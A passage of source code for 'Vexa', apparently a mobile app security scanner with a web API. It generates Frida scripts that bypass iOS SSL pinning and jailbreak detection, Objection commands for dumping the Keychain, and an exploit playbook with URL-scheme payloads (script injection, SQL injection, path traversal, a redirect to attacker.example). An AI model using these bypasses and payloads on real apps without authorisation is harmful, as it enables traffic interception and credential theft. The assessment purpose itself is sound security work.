// Usage: frida -U -f {pkg} -l ios_ssl_bypass.js --no-pause

if (ObjC.available) {{
    console.log("[+] Vexa iOS SSL pinning bypass active");

    // Generic Security framework hook
    try {{
        var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
        if (SecTrustEvaluate) {{
            Interceptor.replace(SecTrustEvaluate, new NativeCallback(function(trust, result) {{
                Memory.writeU32(result, 1);
                return 0;
            }}, 'int', ['pointer', 'pointer']));
            console.log("[+] SecTrustEvaluate hook installed");
        }}
    }} catch (e) {{ console.log("[-] SecTrustEvaluate: " + e); }}

    // TrustKit
    try {{
        var TK = ObjC.classes.TSKPinningValidator;
        if (TK) {{
            TK['- evaluateTrust:forHostname:'].implementation = function(trust, hostname) {{
                console.log('[+] TrustKit bypassed for: ' + hostname);
                return 0;
            }};
        }}
    }} catch (e) {{}}

    // AFNetworking
    try {{
        var ASP = ObjC.classes.AFSecurityPolicy;
        if (ASP) {{
            ASP['- evaluateServerTrust:forDomain:'].implementation = function() {{ return true; }};
            console.log("[+] AFSecurityPolicy bypass active");
        }}
    }} catch (e) {{}}
}} else {{
    console.log("[-] ObjC runtime not available");
}}
"""
    pocs.append(PoC(
        id="poc-ios-ssl-bypass", finding_id="meta",
        title="iOS SSL Pinning Bypass (Frida)", severity="info",
        why="Universal pinning bypass - covers TrustKit, AFNetworking, generic Security.framework.",
        impact="Enable Burp/mitmproxy on pinned iOS apps.",
        artifacts=[PoCArtifact("ios_ssl_bypass.js", frida_ios, "js")],
        confidence="needs-device",
    ))

    # Jailbreak detection bypass
    frida_jb = f"""// Vexa iOS jailbreak detection bypass (Frida)
// Usage: frida -U -f {pkg} -l ios_jailbreak_bypass.js --no-pause

if (ObjC.available) {{
    var jbPaths = ['/Applications/Cydia.app','/Library/MobileSubstrate/MobileSubstrate.dylib',
        '/bin/bash','/usr/sbin/sshd','/etc/apt','/private/var/lib/apt/'];

    try {{
        var FM = ObjC.classes.NSFileManager;
        FM['- fileExistsAtPath:'].implementation = ObjC.implement(FM['- fileExistsAtPath:'], function(self, sel, path) {{
            var p = ObjC.Object(path).toString();
            for (var i = 0; i < jbPaths.length; i++) {{
                if (p === jbPaths[i]) {{ console.log('[+] hid path: ' + p); return 0; }}
            }}
            return this(self, sel, path);
        }});
    }} catch (e) {{}}

    try {{
        var UA = ObjC.classes.UIApplication;
        UA['- canOpenURL:'].implementation = function(url) {{
            var s = ObjC.Object(url).absoluteString().toString();
            if (s.indexOf('cydia') >= 0) {{ return 0; }}
            return this.canOpenURL_(url);
        }};
    }} catch (e) {{}}

    Interceptor.replace(Module.findExportByName(null, 'fork'),
        new NativeCallback(function () {{ return -1; }}, 'int', []));
}}
"""
    pocs.append(PoC(
        id="poc-ios-jailbreak-bypass", finding_id="meta",
        title="iOS Jailbreak Detection Bypass (Frida)", severity="info",
        why="Hooks NSFileManager, canOpenURL, fork() to defeat common JB checks.",
        impact="Run app on jailbroken device for further dynamic analysis.",
        artifacts=[PoCArtifact("ios_jailbreak_bypass.js", frida_jb, "js")],
        confidence="needs-device",
    ))

    objection_sh = f"""#!/bin/bash
# Vexa: Objection toolkit for iOS dynamic analysis
echo "[*] Pre-req: brew install objection"
echo
echo "[*] Attach to running app:"
echo "    objection -g {pkg} explore"
echo
echo "[*] Useful Objection commands:"
echo "    ios sslpinning disable"
echo "    ios jailbreak disable"
echo "    ios keychain dump"
echo "    ios keychain dump --json"
echo "    ios pasteboard monitor"
echo "    ios nsuserdefaults get"
echo "    ios cookies get"
echo "    ios hooking watch class <ClassName>"
echo "    ios hooking set return_value '-[ClassName methodName]' true"
echo
echo "[*] Spawn (not attach):"
echo "    objection -g {pkg} explore --startup-command 'ios sslpinning disable'"
"""
    pocs.append(PoC(
        id="poc-ios-objection", finding_id="meta",
        title="iOS Objection Toolkit", severity="info",
        why="Objection wraps Frida with pre-built commands.",
        impact="Rapid iOS dynamic analysis.",
        artifacts=[PoCArtifact("ios_objection.sh", objection_sh, "sh")],
        confidence="needs-device",
    ))

    return pocs


def build_ios_exploit_playbook(report: dict) -> list:
    """iOS-specific exploit playbook."""
    pkg = report.get("metadata", {}).get("package") or "<bundle>"
    findings = report.get("findings", [])
    extras = report.get("extras", {})
    ids = {f["id"] for f in findings}
    blocks = []

    schemes = extras.get("url_schemes") or []
    if schemes:
        s0 = schemes[0]
        blocks.append({
            "id": "ios-url-schemes",
            "title": f"Probe {len(schemes)} custom URL scheme(s)",
            "severity": "high",
            "why": ("Custom schemes are unauthenticated by iOS. Any other app or a malicious web "
                    "page in Safari can fire them."),
            "steps": [
                ("List schemes", "\n".join(f"{s}://" for s in schemes[:8])),
                ("Trigger from Simulator",
                 f"xcrun simctl openurl booted '{s0}://path?next=https://attacker.example/'"),
                ("Trigger from device - paste in Safari:",
                 f"{s0}://x?url=javascript:alert(1)\n"
                 f"{s0}://x?next=//attacker.example\n"
                 f"{s0}://x?id=' OR '1'='1\n"
                 f"{s0}://x?file=../../etc/passwd"),
                ("Use auto-generated PoC HTML",
                 "Open the PoCs tab, download poc.html, open on test device's Safari."),
            ],
        })

    if any(i in ids for i in ("ios-ats-arbitrary", "ios-ats-domain-exceptions",
                              "ios-ats-webview-arbitrary", "ios-no-pinning")):
        blocks.append({
            "id": "ios-mitm",
            "title": "Set up MITM (Burp Suite)",
            "severity": "critical",
            "why": "ATS weakened or no pinning indicators - traffic interceptable.",
            "steps": [
                ("Configure Burp", "Bind to all interfaces on port 8080."),
                ("On iOS device",
                 "Settings -> Wi-Fi -> (network) -> Configure Proxy -> Manual\n"
                 "Server: <your-ip>   Port: 8080"),
                ("Install Burp CA",
                 "Safari -> http://burp -> CA Certificate -> install profile.\n"
                 "Settings -> General -> About -> Certificate Trust Settings -> enable Burp"),
                ("Launch app and watch traffic in Burp"),
                ("If pinning is in place - combine with Frida bypass",
                 f"frida -U -f {pkg} -l ios_ssl_bypass.js --no-pause"),
            ],
        })

    if any(i in ids for i in ("ios-keychain-always", "ios-keychain-afterfirstunlock", "ios-keychain-wildcard")):
        blocks.append({
            "id": "ios-keychain-dump",
            "title": "Dump Keychain items",
            "severity": "high",
            "why": "Weak Keychain accessibility class.",
            "steps": [
                ("Objection", f"objection -g {pkg} explore\nios keychain dump"),
                ("JSON output", "ios keychain dump --json"),
                ("Test locked-device access",
                 "Lock device, then re-attach: kSecAttrAccessibleAlways items still readable."),
            ],
        })

    if any(i.startswith("ios-secret-") or i.startswith("secret-") for i in ids):
        blocks.append({
            "id": "ios-secrets",
            "title": "Validate hardcoded secrets in binary",
            "severity": "critical",
            "why": "Secrets in iOS binaries are extractable from any IPA copy.",
            "steps": [
                ("AWS keys", "aws sts get-caller-identity"),
                ("Stripe keys", "curl -u <key>: https://api.stripe.com/v1/balance"),
                ("Firebase URLs", "curl '<firebase-url>/.json'"),
                ("Generic tokens", "Use Burp Repeater with leaked token in Authorization header."),
                ("PoC validators", "See PoCs tab for ready-made validators per secret type"),
            ],
        })

    if not blocks:
        blocks.append({
            "id": "ios-baseline",
            "title": "iOS baseline assessment workflow",
            "severity": "info",
            "why": "No high-confidence findings to chain.",
            "steps": [
                ("Static review of strings",
                 "strings <Payload>/<App>.app/<Executable> | grep -E 'http|key|token'"),
                ("Frida attach", f"frida -U -f {pkg} --no-pause"),
                ("Objection explore", f"objection -g {pkg} explore"),
                ("Burp + bypass", "ios sslpinning disable\nios jailbreak disable"),
            ],
        })
    return blocks


def run_ios_analysis(ipa_path: str) -> dict:
    log.info("Loading IPA: %s", ipa_path)
    ctx = load_ipa(ipa_path)
    if ctx is None:
        return {"error": "Could not parse IPA. Verify it's a valid .ipa archive."}
    findings = []
    for name, fn in IOS_ANALYZERS:
        try:
            log.info("  > ios:%s", name)
            findings.extend(fn(ctx) or [])
        except Exception as e:
            log.exception("iOS analyzer %s failed", name)
            findings.append(Finding(id=f"err-ios-{name}",
                                     title=f"iOS analyzer '{name}' failed",
                                     severity="info", category="meta",
                                     description=str(e), confidence="possible", source="vexa"))
    info = ctx.info_plist or {}
    meta = {
        "platform": "iOS",
        "package": info.get("CFBundleIdentifier", ""),
        "version_name": info.get("CFBundleShortVersionString", ""),
        "version_code": info.get("CFBundleVersion", ""),
        "min_sdk": info.get("MinimumOSVersion", ""),
        "target_sdk": "",
        "main_activity": info.get("CFBundleExecutable", ""),
        "activities": [], "services": [], "receivers": [], "providers": [],
        "apk_size_bytes": Path(ipa_path).stat().st_size,
        "display_name": info.get("CFBundleDisplayName", "") or info.get("CFBundleName", ""),
    }
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: sev_order.get(f.severity, 9))
    summary = {s: 0 for s in sev_order}
    for fnd in findings:
        if fnd.severity in summary: summary[fnd.severity] += 1
    return {
        "metadata": meta,
        "summary": summary,
        "findings": enrich_findings([fnd.to_dict() for fnd in findings]),
        "extras": {
            "url_schemes": ctx.extras.get("url_schemes", []),
            "universal_links": ctx.extras.get("universal_links", []),
            "app_queries": ctx.extras.get("app_queries", []),
            "privacy_keys": ctx.extras.get("privacy_keys", []),
            "deeplinks": [{"uri": s + "://", "activity": "<scheme handler>", "scheme": s,
                            "host": "", "auto_verify": False}
                           for s in ctx.extras.get("url_schemes", [])],
            "permissions": [k for k in (ctx.info_plist or {}).keys() if k.endswith("UsageDescription")],
            "exported_components": [],
            "natives": {},
        },
    }
def _validate_scan_id(sid: str) -> str:
    """Reject scan_id values that aren't safe filename components.
    Accepts a UUID-like or hex/alphanumeric token (no separators, no traversal)."""
    if not sid or not isinstance(sid, str):
        raise HTTPException(400, "Invalid scan id")
    if len(sid) > 64 or len(sid) < 8:
        raise HTTPException(400, "Invalid scan id")
    if not re.match(r"^[a-zA-Z0-9_\-]+$", sid):
        raise HTTPException(400, "Invalid scan id")
    return sid


def _safe_binary_path(report: dict) -> Optional[str]:
    """Return the apk_path/ipa_path from the report if it resolves inside UPLOAD_DIR.
    Defence in depth against tampered report JSON."""
    candidate = report.get("apk_path") or report.get("ipa_path")
    if not candidate:
        return None
    try:
        p = Path(candidate).resolve()
        upload_root = UPLOAD_DIR.resolve()
        if not str(p).startswith(str(upload_root) + os.sep) and str(p) != str(upload_root):
            log.warning("Rejected binary path outside upload dir: %s", candidate)
            return None
        if not p.exists():
            return None
        return str(p)
    except (OSError, ValueError) as e:
        log.warning("Could not resolve binary path: %s", e)
        return None


def _load(sid):
    sid = _validate_scan_id(sid)
    p = REPORT_DIR / f"{sid}.json"
    # Defence-in-depth: ensure the resolved path is still inside REPORT_DIR
    try:
        p_resolved = p.resolve()
        REPORT_DIR_resolved = REPORT_DIR.resolve()
        if not str(p_resolved).startswith(str(REPORT_DIR_resolved)):
            raise HTTPException(400, "Invalid scan id")
    except (OSError, ValueError):
        raise HTTPException(400, "Invalid scan id")
    if not p.exists():
        raise HTTPException(404, "Not found")
    with p.open("r", encoding="utf-8") as f:
        return json.load(f)


@app.get("/api/health")
async def health():
    try:
        scan_count = len([p for p in REPORT_DIR.glob("*.json") if not p.stem.endswith(".dynamic")])
    except Exception:
        scan_count = 0
    return {
        "status": "ok",
        "adb": adb_path() is not None,
        "ollama": await ollama_available(),
        "ollama_models": await ollama_list_models() if await ollama_available() else [],
        "data_dir": str(DATA_DIR),
        "saved_scans": scan_count,
        "plugin_api_version": VEXA_PLUGIN_API_VERSION,
        "plugins_loaded": sum(1 for p in _PLUGIN_REGISTRY["_loaded_plugins"] if not p.get("error")),
    }


@app.get("/api/plugins")
async def list_plugins_endpoint():
    """Return metadata about all loaded plugins."""
    return {
        "api_version": VEXA_PLUGIN_API_VERSION,
        "schema_version": FINDING_SCHEMA_VERSION,
        "plugins": list_plugins(),
        "registry_summary": {
            "analyzers": len(_PLUGIN_REGISTRY["analyzers"]),
            "secret_patterns": len(_PLUGIN_REGISTRY["secret_patterns"]),
            "exploit_recipes": len(_PLUGIN_REGISTRY["exploit_recipes"]),
            "report_sections": len(_PLUGIN_REGISTRY["report_sections"]),
            "cve_enrichment": len(_PLUGIN_REGISTRY["cve_enrichment"]),
            "hooks": {k: len(v) for k, v in _PLUGIN_REGISTRY["hooks"].items()},
        },
    }


@app.get("/api/devices")
async def devices():
    return {"devices": await adb_devices(), "adb_path": adb_path()}


@app.post("/api/scan")
async def scan(file: UploadFile = File(...)):
    if not file.filename:
        raise HTTPException(400, "No filename provided")
    fn_lower = file.filename.lower()
    is_ipa = fn_lower.endswith(".ipa")
    is_apk = fn_lower.endswith(".apk")
    if not (is_apk or is_ipa):
        raise HTTPException(400, "Please upload a .apk (Android) or .ipa (iOS) file")
    sid = uuid.uuid4().hex[:12]
    ext = ".ipa" if is_ipa else ".apk"
    apk_path = UPLOAD_DIR / f"{sid}{ext}"
    max_bytes = MAX_UPLOAD_MB * 1024 * 1024
    written = 0
    with apk_path.open("wb") as out:
        while True:
            chunk = await file.read(1024 * 1024)
            if not chunk: break
            written += len(chunk)
            if written > max_bytes:
                out.close(); apk_path.unlink(missing_ok=True)
                raise HTTPException(413, f"File exceeds {MAX_UPLOAD_MB} MB")
            out.write(chunk)
    log.info("Saved %s (%.1f MB)", apk_path.name, written / 1024 / 1024)
    try:
        if is_ipa:
            report = run_ios_analysis(str(apk_path))
            if report.get("error"):
                raise HTTPException(400, report["error"])
        else:
            report = run_analysis(str(apk_path))
    except HTTPException:
        raise
    except Exception as e:
        log.exception("Analysis failed")
        raise HTTPException(500, f"Analysis failed: {e}")
    report["scan_id"] = sid
    report["filename"] = file.filename
    report["apk_path"] = str(apk_path)
    report["platform"] = "iOS" if is_ipa else "Android"
    with (REPORT_DIR / f"{sid}.json").open("w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, default=str)
    return {"scan_id": sid, "report": report}


# =============================================================================
# Store URL scanning: Play Store APK fetch + App Store metadata
# =============================================================================

_PLAYSTORE_RE = re.compile(r'play\.google\.com/store/apps/details\?[^#]*[?&]?id=([a-zA-Z0-9_.]+)')
_APPSTORE_RE  = re.compile(r'apps\.apple\.com/(?:[a-z]{2}/)?app(?:/[^/]+)?/id(\d+)', re.IGNORECASE)


def _parse_store_url(url: str):
    """Returns ('android'|'ios', identifier) or raises ValueError."""
    url = url.strip()
    m = _PLAYSTORE_RE.search(url)
    if m:
        return ('android', m.group(1))
    m = _APPSTORE_RE.search(url)
    if m:
        return ('ios', m.group(1))
    raise ValueError("URL must be a Play Store (play.google.com/store/apps/details?id=...) "
                     "or App Store (apps.apple.com/.../id...) URL.")


_BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")


async def _fetch_playstore_metadata(package: str) -> dict:
    """Scrape basic metadata from the public Play Store listing page."""
    info = {"package": package}
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True,
                                      headers={"User-Agent": _BROWSER_UA, "Accept-Language": "en-US,en;q=0.9"}) as client:
            r = await client.get(f"https://play.google.com/store/apps/details?id={package}&hl=en")
            if r.status_code == 200:
                # Extract the document title for app name
                m = re.search(r"<title>([^<]+)</title>", r.text)
                if m:
                    title = m.group(1).strip()
                    title = re.sub(r"\s*-\s*Apps on Google Play\s*$", "", title)
                    info["name"] = title
                # Look for "Updated on" / version info — Play Store HTML is dynamic, this is best-effort
                m = re.search(r'"v\d+\.\d+(?:\.\d+)*[^"]*"', r.text)
                if m:
                    info["version_hint"] = m.group(0).strip('"')
    except Exception as e:
        log.warning("Play Store metadata fetch failed: %s", e)
    return info


async def _try_apkpure_direct(package: str, dest: Path) -> tuple:
    """APKPure's documented direct-download widget URL.
    Reference: https://apkpure.com/apk-download-web-widget
    Pattern: https://d.apkpure.com/b/APK/{package}?version=latest
    Far more reliable than HTML scraping."""
    headers = {
        "User-Agent": _BROWSER_UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://apkpure.com/",
    }
    # Try APK first, fall back to XAPK
    for fmt in ("APK", "XAPK"):
        url = f"https://d.apkpure.com/b/{fmt}/{package}?version=latest"
        try:
            log.info("APKPure direct: %s", url)
            async with httpx.AsyncClient(timeout=120, follow_redirects=True, headers=headers) as client:
                async with client.stream("GET", url) as r:
                    if r.status_code != 200:
                        log.info("APKPure direct returned HTTP %d for %s", r.status_code, fmt)
                        continue
                    ctype = r.headers.get("content-type", "")
                    # Reject if served HTML (means: package not found, error page)
                    if "html" in ctype.lower():
                        continue
                    written = 0
                    with dest.open("wb") as fh:
                        async for chunk in r.aiter_bytes(chunk_size=1024 * 256):
                            if not chunk:
                                continue
                            fh.write(chunk)
                            written += len(chunk)
                            if written > MAX_UPLOAD_MB * 1024 * 1024:
                                fh.close()
                                dest.unlink(missing_ok=True)
                                return (False, f"File exceeds {MAX_UPLOAD_MB} MB upload limit.")
            # Validate ZIP magic
            if dest.exists() and dest.stat().st_size > 100_000:
                with dest.open("rb") as fh:
                    magic = fh.read(4)
                if magic == b"PK\x03\x04":
                    return (True, f"OK ({written/1024/1024:.1f} MB) -- via APKPure direct ({fmt})")
            dest.unlink(missing_ok=True)
        except Exception as e:
            log.warning("APKPure direct attempt failed (%s): %s", fmt, e)
            continue
    return (False, "APKPure direct widget did not return a valid file.")


async def _try_apkpure_download(package: str, dest: Path) -> tuple:
    """Best-effort APK download from the public APKPure mirror.
    Returns (success, message). On success, file is written to `dest`."""
    headers = {
        "User-Agent": _BROWSER_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://apkpure.com/",
    }
    bases = ["https://apkpure.com", "https://apkpure.net"]

    async with httpx.AsyncClient(timeout=60, follow_redirects=True, headers=headers) as client:
        for base in bases:
            try:
                # Step 1: hit the package's app page
                page_url = f"{base}/x/{package}"
                log.info("APKPure: trying %s", page_url)
                r = await client.get(page_url)
                if r.status_code != 200:
                    continue
                html_body = r.text

                # Step 2: find "/...{package}/download" link
                dl_path_match = re.search(
                    r'href="(/[^"]+' + re.escape(package) + r'/download[^"]*)"',
                    html_body
                )
                download_page = None
                if dl_path_match:
                    download_page = base + dl_path_match.group(1)
                else:
                    # fallback: try a guessed URL form
                    download_page = page_url + "/download"

                log.info("APKPure: download page %s", download_page)
                r2 = await client.get(download_page)
                if r2.status_code != 200:
                    continue
                dl_html = r2.text

                # Step 3: find direct .apk / .xapk URL
                m = re.search(r'href="(https?://[^"]+\.(?:apk|xapk)[^"]*)"', dl_html)
                if not m:
                    # Try meta refresh / data attr
                    m = re.search(r'data-dt-app-url="(https?://[^"]+\.apk[^"]*)"', dl_html)
                if not m:
                    continue
                apk_url = m.group(1)
                if apk_url.endswith(".xapk"):
                    return (False, "APKPure only offers .xapk (split APKs) for this app. "
                                    "Download manually and merge via apktool, then upload.")
                log.info("APKPure: fetching %s", apk_url)

                # Step 4: stream the APK to disk
                async with client.stream("GET", apk_url) as r3:
                    if r3.status_code != 200:
                        continue
                    written = 0
                    with dest.open("wb") as fh:
                        async for chunk in r3.aiter_bytes(chunk_size=1024 * 256):
                            fh.write(chunk)
                            written += len(chunk)
                            if written > MAX_UPLOAD_MB * 1024 * 1024:
                                fh.close()
                                dest.unlink(missing_ok=True)
                                return (False, f"APK exceeds {MAX_UPLOAD_MB} MB upload limit.")
                # Sanity: an APK is a ZIP starting with PK\x03\x04
                with dest.open("rb") as fh:
                    magic = fh.read(4)
                if magic != b"PK\x03\x04":
                    dest.unlink(missing_ok=True)
                    return (False, "Downloaded file is not a valid APK (mirror may have served HTML).")
                return (True, f"OK ({written/1024/1024:.1f} MB)")
            except Exception as e:
                log.warning("APKPure attempt at %s failed: %s", base, e)
                continue
    return (False, "All public APK mirrors failed. The app may be paid, region-locked, or APKPure changed their HTML.")


async def _try_apkcombo_download(package: str, dest: Path) -> tuple:
    """Best-effort download from APKCombo. Returns (success, message)."""
    headers = {
        "User-Agent": _BROWSER_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://apkcombo.com/",
    }
    bases = ["https://apkcombo.com", "https://apkcombo.app"]
    async with httpx.AsyncClient(timeout=60, follow_redirects=True, headers=headers) as client:
        for base in bases:
            try:
                page_url = f"{base}/x/{package}/download/apk"
                log.info("APKCombo: trying %s", page_url)
                r = await client.get(page_url)
                if r.status_code != 200:
                    # Try alternate URL pattern
                    page_url = f"{base}/{package}/download/apk"
                    r = await client.get(page_url)
                    if r.status_code != 200:
                        continue
                html_body = r.text
                # APKCombo uses verify links / direct .apk URLs
                m = re.search(r'href="(https?://[^"]+\.apk[^"]*)"', html_body)
                if not m:
                    m = re.search(r'data-url="(https?://[^"]+\.apk[^"]*)"', html_body)
                if not m:
                    continue
                apk_url = m.group(1)
                log.info("APKCombo: fetching %s", apk_url)
                async with client.stream("GET", apk_url) as r2:
                    if r2.status_code != 200:
                        continue
                    written = 0
                    with dest.open("wb") as fh:
                        async for chunk in r2.aiter_bytes(chunk_size=1024 * 256):
                            fh.write(chunk)
                            written += len(chunk)
                            if written > MAX_UPLOAD_MB * 1024 * 1024:
                                fh.close()
                                dest.unlink(missing_ok=True)
                                return (False, f"APK exceeds {MAX_UPLOAD_MB} MB upload limit.")
                with dest.open("rb") as fh:
                    magic = fh.read(4)
                if magic != b"PK\x03\x04":
                    dest.unlink(missing_ok=True)
                    continue
                return (True, f"OK ({written/1024/1024:.1f} MB) -- via APKCombo")
            except Exception as e:
                log.warning("APKCombo attempt at %s failed: %s", base, e)
                continue
    return (False, "APKCombo did not yield a valid APK.")


async def _try_multi_source_download(package: str, dest: Path) -> tuple:
    """Try multiple public APK mirrors in order. Returns (success, message).
    Order: APKPure direct widget (most reliable) -> APKPure scrape -> APKCombo scrape."""
    log.info("Trying multi-source APK download for %s", package)

    # Source 1: APKPure direct widget URL (documented, doesn't require scraping)
    ok, msg = await _try_apkpure_direct(package, dest)
    if ok:
        return (True, msg)
    log.info("APKPure direct failed: %s -- trying scrape fallback", msg)

    # Source 2: APKPure HTML scrape (legacy fallback)
    ok, msg2 = await _try_apkpure_download(package, dest)
    if ok:
        return (True, msg2 + " (via APKPure scrape)")
    log.info("APKPure scrape failed: %s -- trying APKCombo", msg2)

    # Source 3: APKCombo scrape
    ok, msg3 = await _try_apkcombo_download(package, dest)
    if ok:
        return (True, msg3)

    return (False, f"All sources failed.\n  Direct: {msg}\n  Scrape: {msg2}\n  APKCombo: {msg3}")


async def _fetch_appstore_metadata(app_id: str) -> dict:
    """Public iTunes Lookup API. Free, no auth, well-documented."""
    async with httpx.AsyncClient(timeout=20, follow_redirects=True,
                                  headers={"User-Agent": _BROWSER_UA}) as client:
        r = await client.get(f"https://itunes.apple.com/lookup?id={app_id}")
        if r.status_code != 200:
            raise HTTPException(502, f"iTunes Lookup API returned HTTP {r.status_code}")
        try:
            data = r.json()
        except Exception:
            raise HTTPException(502, "iTunes Lookup API returned invalid JSON")
        results = data.get("results") or []
        if not results:
            raise HTTPException(404, f"No iOS app found with track ID {app_id}")
        return results[0]


@app.post("/api/scan/url")
async def scan_from_url(body: dict = Body(...)):
    """Fetch app from public store URL and run analysis.

    For Android: extracts the package name and attempts download from public mirror.
    For iOS: fetches public metadata; cannot auto-download IPA (FairPlay encrypted).
    """
    raw_url = (body.get("url") or "").strip()
    if not raw_url:
        raise HTTPException(400, "URL is required.")
    try:
        platform, identifier = _parse_store_url(raw_url)
    except ValueError as e:
        raise HTTPException(400, str(e))

    if platform == "android":
        # Best-effort APK download
        sid = uuid.uuid4().hex[:12]
        apk_path = UPLOAD_DIR / f"{sid}.apk"
        ok, msg = await _try_multi_source_download(identifier, apk_path)
        if not ok:
            raise HTTPException(503,
                f"Could not auto-download {identifier}. {msg}\n\n"
                f"Manual options:\n"
                f"  -- APKPure:    https://apkpure.com/x/{identifier}\n"
                f"  -- APKMirror:  https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s={identifier}\n"
                f"  -- APKCombo:   https://apkcombo.com/x/{identifier}\n\n"
                f"Then upload the .apk via the file dropzone.")
        log.info("Auto-fetched APK for %s -> %s", identifier, apk_path)
        try:
            report = run_analysis(str(apk_path))
        except Exception as e:
            log.exception("Analysis failed")
            raise HTTPException(500, f"Analysis failed: {e}")
        report["scan_id"] = sid
        report["filename"] = f"{identifier}.apk"
        report["apk_path"] = str(apk_path)
        report["platform"] = "Android"
        report["source_url"] = raw_url
        report["fetched_from"] = "apkpure (public mirror)"
        with (REPORT_DIR / f"{sid}.json").open("w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, default=str)
        return {"scan_id": sid, "report": report}

    elif platform == "ios":
        # iTunes metadata only (cannot decrypt IPAs from App Store)
        try:
            meta = await _fetch_appstore_metadata(identifier)
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(502, f"App Store metadata fetch failed: {e}")
        bundle_id = meta.get("bundleId") or ""
        return {
            "type": "metadata_only",
            "platform": "iOS",
            "metadata": {
                "bundle_id":    bundle_id,
                "name":         meta.get("trackName") or "",
                "developer":    meta.get("artistName") or meta.get("sellerName") or "",
                "version":      meta.get("version") or "",
                "rating":       meta.get("averageUserRating"),
                "rating_count": meta.get("userRatingCount"),
                "min_os":       meta.get("minimumOsVersion") or "",
                "size_bytes":   meta.get("fileSizeBytes"),
                "release_date": meta.get("currentVersionReleaseDate") or meta.get("releaseDate") or "",
                "categories":   meta.get("genres") or [],
                "track_id":     identifier,
            },
            "message": (
                "iOS IPAs from the App Store are encrypted with FairPlay DRM and CANNOT be "
                "downloaded automatically.\n\n"
                "Options to obtain the unencrypted IPA:\n\n"
                f"  1) ipatool (recommended, requires your Apple ID):\n"
                f"     brew install ipatool\n"
                f"     ipatool auth login -e <your-apple-id>\n"
                f"     ipatool download -b {bundle_id}\n\n"
                f"  2) frida-ios-dump (jailbroken device required):\n"
                f"     git clone https://github.com/AloneMonkey/frida-ios-dump\n"
                f"     ./dump.py {bundle_id}\n\n"
                f"  3) Apple Configurator 2 (macOS only):\n"
                f"     File -> Add Apps... -> sign in -> select app -> right-click 'Show in Finder'\n\n"
                f"Then drop the resulting .ipa into the Upload binary tab."
            ),
        }

    raise HTTPException(400, "Unsupported store URL.")


@app.get("/api/scan/{sid}")
async def get_scan(sid: str):
    return _load(sid)


@app.get("/api/scan/{sid}/manifest")
async def get_manifest(sid: str):
    """Return the parsed AndroidManifest.xml from the original APK as pretty-printed XML.
    For iOS scans, returns the Info.plist."""
    report = _load(sid)
    apk_path = _safe_binary_path(report)
    if not apk_path:
        raise HTTPException(404, "Original binary no longer on disk. Re-scan to view manifest.")

    platform = report.get("platform", "Android")

    if platform == "iOS":
        # iOS: extract Info.plist from IPA
        try:
            import zipfile, plistlib
            with zipfile.ZipFile(apk_path) as z:
                # Find Payload/<App>.app/Info.plist
                plist_path = None
                for name in z.namelist():
                    if re.match(r"Payload/[^/]+\.app/Info\.plist$", name):
                        plist_path = name; break
                if not plist_path:
                    raise HTTPException(404, "Info.plist not found in IPA.")
                raw = z.read(plist_path)
            # plistlib loads both binary and XML plists
            try:
                pl = plistlib.loads(raw)
                pretty = plistlib.dumps(pl).decode("utf-8", errors="replace")
            except Exception:
                pretty = raw.decode("utf-8", errors="replace")
            return {"manifest": pretty, "filename": "Info.plist", "format": "plist"}
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(500, f"Failed to extract Info.plist: {e}")

    # Android: pretty-print AndroidManifest.xml
    try:
        apk = _load_apk_object(apk_path)
        # androguard returns ElementTree from get_android_manifest_xml()
        xml_obj = apk.get_android_manifest_xml()
        if xml_obj is None:
            raise HTTPException(404, "Could not parse AndroidManifest.xml")
        try:
            from lxml import etree as _etree
            xml_str = _etree.tostring(xml_obj, pretty_print=True, encoding="unicode")
        except Exception:
            # Fallback to stdlib ElementTree
            import xml.etree.ElementTree as ET
            try:
                import xml.dom.minidom as _md
                rough = ET.tostring(xml_obj, encoding="unicode")
                xml_str = _md.parseString(rough).toprettyxml(indent="  ")
            except Exception:
                xml_str = ET.tostring(xml_obj, encoding="unicode")
        return {"manifest": xml_str, "filename": "AndroidManifest.xml", "format": "xml"}
    except HTTPException:
        raise
    except Exception as e:
        log.exception("Manifest extraction failed")
        raise HTTPException(500, f"Failed to extract manifest: {e}")


@app.get("/api/scan/{sid}/manifest_components")
async def get_manifest_components(sid: str):
    """Parse AndroidManifest.xml and return structured per-component data:
    name, exported state, required permission, intent filters (action/category/data), authorities."""
    report = _load(sid)
    apk_path = _safe_binary_path(report)
    if not apk_path:
        raise HTTPException(404, "Original binary no longer on disk. Re-scan to view components.")

    if report.get("platform") == "iOS":
        return {"components": {"activities": [], "services": [], "receivers": [], "providers": []}, "platform": "iOS"}

    try:
        apk = _load_apk_object(apk_path)
        pkg = apk.get_package() or ""
        result = {"activities": [], "services": [], "receivers": [], "providers": []}
        tag_to_key = {"activity": "activities", "activity-alias": "activities",
                      "service": "services", "receiver": "receivers", "provider": "providers"}

        # Get raw manifest XML element to walk children
        xml_obj = apk.get_android_manifest_xml()
        if xml_obj is None:
            raise HTTPException(404, "Could not parse AndroidManifest.xml")

        # Helpers
        def _attr(el, name):
            for k, v in el.attrib.items():
                if k.endswith("}" + name) or k == name:
                    return v
            return None

        # Walk through application children
        for app_el in xml_obj.iter():
            tag = app_el.tag
            if isinstance(tag, str) and "}" in tag:
                tag = tag.split("}", 1)[1]
            if tag not in tag_to_key:
                continue

            name = _attr(app_el, "name") or ""
            # Resolve relative names
            full_name = name
            if name.startswith("."):
                full_name = pkg + name
            elif name and "." not in name:
                full_name = pkg + "." + name

            exported_attr = _attr(app_el, "exported")
            permission = _attr(app_el, "permission")
            authorities = _attr(app_el, "authorities")
            enabled = _attr(app_el, "enabled")
